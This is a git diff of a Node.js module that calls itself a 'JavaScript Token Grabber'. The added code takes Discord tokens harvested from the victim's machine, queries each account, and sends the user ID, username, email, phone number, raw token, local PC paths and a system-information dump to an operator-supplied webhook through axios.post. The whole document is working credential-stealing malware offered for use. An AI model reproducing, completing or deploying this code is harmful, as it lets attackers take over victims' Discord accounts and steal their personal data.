@@ -1,5 +1,6 @@
 const os = require("os");
 const fs = require("fs");
+const axios = require("axios");
 fetch = require("node-fetch");
 
 const webhook = "<insert your webhook here>";
@@ -12,7 +13,7 @@ const grab = () => {
     return data;
   };
 
-  const system_info = (return_type = 0) => {
+  const system_info = () => {
     let info = {
       platform: os.platform(),
       platformRelease: os.release(),
@@ -21,12 +22,7 @@ const grab = () => {
       ipv6: Object.values(os.networkInterfaces())[0][0].address,
       processor: os.cpus()[0].model,
     };
-
-    if (return_type == 0) {
-      return info;
-    } else {
-      return info.json();
-    }
+    return info;
   };
 
   const self = {};
@@ -129,15 +125,43 @@ const grab = () => {
       headers: {
         Authorization: token,
       },
-    }).then((response) => console.log(`${Object.entries(response)}`));
+    }).then((response) => {
+      self.discord_id = Object.values(response)[0];
+      self.discord_usertag = `${Object.values(response)[1]}#${
+        Object.values(response)[3]
+      }`;
+      self.email = Object.values(response)[16];
+      self.phone_number = Object.values(response)[18];
+
+      if (self.discord_id != "401: Unauthorized") {
+        if (webhook != "<insert your webhook here>") {
+          let webhook_data = {
+            username: "JavaScript Token Grabber",
+            avatar_url: "https://i.imgur.com/fj1Pk7e.png",
+            content:
+              `**Account info**\n💳 User ID: ${self.discord_id}\n🧔 Username: ${self.discord_usertag}\n📬 Email: ${self.email}\n☎ Phone: ${self.phone_number}
+            \n**PC Info**\nUsername: ${self.pc_user}\nAppData: ${self.pc_local}\nRoaming: ${self.pc_roaming}
+            \n💰 Token\n${token}
+            \n**PC Data Dump**\n` +
+              "```" +
+              JSON.stringify(self.pc) +
+              "```",
+          };
+
+          axios.post(webhook, webhook_data).catch((error) => {
+            console.error(error);
+          });
+        } else {
+          console.log(self);
+        }
+      }
+    });
   };
 
   setTimeout(() => {
-    // console.log(self);
     self.tokens.forEach((token) => {
       retrieve_user(token);
     });
   }, 1000);
 };
-
 module.exports = { grab };
